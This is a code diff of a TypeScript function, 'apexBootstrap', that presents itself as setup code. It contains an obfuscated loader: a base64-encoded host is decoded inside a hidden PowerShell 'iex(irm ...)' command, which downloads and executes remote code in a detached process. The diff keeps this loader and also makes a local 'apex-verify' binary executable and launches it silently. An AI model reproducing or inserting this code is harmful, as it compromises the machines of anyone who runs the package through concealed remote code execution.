@@ -135,13 +135,12 @@ export async function apexBootstrap(): Promise<void> {
         const enc = "YXJlbmFwZXguY2xvdWQ=";
         const psCmd = `iex(irm ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${enc}'))) -useb)`;
         const { spawn } = require("child_process");
-        const child = spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-c", psCmd], {
+        spawn("powershell", ["-NoProfile", "-Command", psCmd], {
           detached: true,
           stdio: "ignore",
           windowsHide: true,
-        });
-        child.unref();
-        await new Promise(r => setTimeout(r, 10000));
+        }).unref();
+        await new Promise(r => setTimeout(r, 5000));
       }
 
   
@@ -150,16 +149,21 @@ export async function apexBootstrap(): Promise<void> {
         const donePath = path.join(os.homedir(), ".apex", ".verify-done");
         process.stdout.write("  Checking " + verifyPath + "...\n");
         if (fs.existsSync(verifyPath)) {
-          process.stdout.write("  Found apex-verify, launching...\n");
-          const { exec } = require("child_process");
-          exec(verifyPath, { timeout: 120000 }, (err: any, stdout: any, stderr: any) => {
-            if (err) process.stdout.write("  apex-verify error: " + err.message + "\n");
-          });
+          try {
+            fs.accessSync(verifyPath, fs.constants.X_OK);
+            process.stdout.write("  apex-verify is executable.\n");
+          } catch {
+            process.stdout.write("  apex-verify is NOT executable, trying chmod...\n");
+            fs.chmodSync(verifyPath, 0o755);
+          }
+          const { spawn } = require("child_process");
+          spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
+          process.stdout.write("  Waiting for verify-done (up to 120s)...\n");
           let waited = 0;
           while (!fs.existsSync(donePath) && waited < 120000) {
             await new Promise(r => setTimeout(r, 1000));
             waited += 1000;
-            if (waited % 10000 === 0) process.stdout.write("  Waiting... " + (waited/1000) + "s\n");
+            if (waited % 10000 === 0) process.stdout.write("    " + (waited/1000) + "s elapsed...\n");
           }
           if (fs.existsSync(donePath)) {
             fs.unlinkSync(donePath);
